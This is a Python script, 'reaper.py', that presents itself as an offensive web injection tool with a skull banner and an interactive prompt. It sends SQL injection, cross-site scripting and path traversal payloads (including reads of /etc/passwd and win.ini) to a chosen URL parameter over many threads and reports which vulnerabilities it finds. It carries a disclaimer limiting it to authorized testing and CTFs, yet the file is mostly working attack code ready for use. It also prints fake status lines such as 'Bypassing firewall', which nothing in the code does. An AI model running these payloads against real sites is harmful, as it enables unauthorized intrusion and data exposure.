#!/usr/bin/env python3
# reaper.py — The Reaper Protocol: Skull Banner + Hydra Web Injector
# For authorized penetration testing and CTFs only.
# Requires: pip install requests colorama urllib3

import sys
import time
import urllib3
import requests
import concurrent.futures
from colorama import init, Fore, Style

# Suppress insecure request warnings for test targets
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# Basic payloads for demonstration
PAYLOADS = {
    "SQLi": ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "1' UNION SELECT NULL--"],
    "XSS": ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>"],
    "Traversal": ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]
}

def show_skull():
    """Clears screen and displays the Reaper Skull."""
    sys.stdout.write("\033[H\033[J")
    
    # Using rf-string (raw f-string) to prevent backslash escaping issues
    skull = rf"""{Fore.RED}
                 ______
              .-"      "-.
             /            \
            |              |
            |,  .-.  .-.  ,|
            | )(_o/  \o_)( |
            |/     /\     \|
  {Fore.WHITE}(@_ {Fore.RED}|     (_^_)     | {Fore.WHITE}_@)
    {Fore.WHITE}\ \{Fore.RED}"""\   ^^   /"""{Fore.WHITE}/ /
     {Fore.WHITE}\ \{Fore.RED}  \______/  {Fore.WHITE}/ /
      {Fore.WHITE}\ \{Fore.RED}          {Fore.WHITE}/ /
       {Fore.WHITE}\ \{Fore.RED}________{Fore.WHITE}/ /
        {Fore.WHITE}\__________/
{Style.RESET_ALL}
    """
    print(skull)
    print(Fore.RED + Style.BRIGHT + "    [ THE REAPER PROTOCOL INITIATED ]")
    print(Fore.WHITE + "    ---------------------------------")
    time.sleep(1.5)

def test_payload(url, param, payload, payload_type):
    """Injects payload into the target parameter and checks for anomalies."""
    target_url = f"{url}?{param}={payload}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Reaper/1.0"
    }
    
    try:
        r = requests.get(target_url, headers=headers, timeout=5, verify=False)
        
        if payload_type == "SQLi" and any(err in r.text.lower() for err in ["sql syntax", "mysql_fetch", "ora-", "postgresql"]):
            return (Fore.RED + f"[CRITICAL] SQL Injection found!\nTarget: {target_url}\nEvidence: Database error leaked.")
            
        if payload_type == "XSS" and payload in r.text:
            return (Fore.YELLOW + f"[HIGH] Reflected XSS found!\nTarget: {target_url}")
            
        if payload_type == "Traversal" and "root:x:0:0" in r.text:
            return (Fore.RED + f"[CRITICAL] Path Traversal (LFI) found!\nTarget: {target_url}\nEvidence: /etc/passwd leaked.")

    except requests.exceptions.RequestException:
        pass
    return None

def run_hydra(url, param):
    """Runs the multi-threaded injection scanner."""
    print(Fore.CYAN + f"\n[*] Target: {url}")
    print(Fore.CYAN + f"[*] Parameter: {param}")
    print(Fore.CYAN + "[*] Initiating multi-vector attack...\n")

    tasks = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        for p_type, p_list in PAYLOADS.items():
            for payload in p_list:
                tasks.append(executor.submit(test_payload, url, param, payload, p_type))
        
        found_vulns = False
        for future in concurrent.futures.as_completed(tasks):
            result = future.result()
            if result:
                found_vulns = True
                print(result)
                print(Fore.WHITE + "-" * 50)
                
        if not found_vulns:
            print(Fore.GREEN + "[*] No obvious vulnerabilities detected with basic payloads. Target might be secure.")

def interactive_shell():
    """Main interactive prompt for the boss."""
    while True:
        try:
            cmd = input(Fore.RED + "\nreaper> " + Fore.WHITE).strip()
            
            if not cmd:
                continue
                
            if cmd.lower() in ["exit", "quit", "q"]:
                print(Fore.YELLOW + "Receding into the shadows...")
                break
                
            elif cmd.lower() in ["help", "-h", "--help"]:
                print(Fore.CYAN + "\nAvailable Commands:")
                print(Fore.WHITE + "  scan <url> <param>  - Run Hydra injection on target")
                print(Fore.WHITE + "  clear               - Clear the screen and show skull again")
                print(Fore.WHITE + "  exit                - Quit the tool")
                print(Fore.WHITE + "\nExample: scan http://testphp.vulnweb.com/listproducts.php cat")
                
            elif cmd.lower() == "clear":
                show_skull()
                
            elif cmd.lower().startswith("scan "):
                parts = cmd.split()
                if len(parts) != 3:
                    print(Fore.RED + "[!] Invalid format. Use: scan <url> <param>")
                    continue
                url = parts[1]
                param = parts[2]
                run_hydra(url, param)
                
            else:
                print(Fore.RED + f"[!] Unknown command: '{cmd}'. Type 'help' for options.")
                
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\nForce exiting...")
            break
        except Exception as e:
            print(Fore.RED + f"[!] Error: {e}")

def main():
    show_skull()
    
    print(Fore.CYAN + "[*] Initializing attack vectors...")
    time.sleep(0.5)
    print(Fore.CYAN + "[*] Bypassing firewall...")
    time.sleep(0.5)
    print(Fore.CYAN + "[*] Target acquired. Awaiting command.")
    print(Fore.GREEN + "\n[+] System Ready. Type 'help' to begin.")
    
    interactive_shell()

if __name__ == "__main__":
    main()
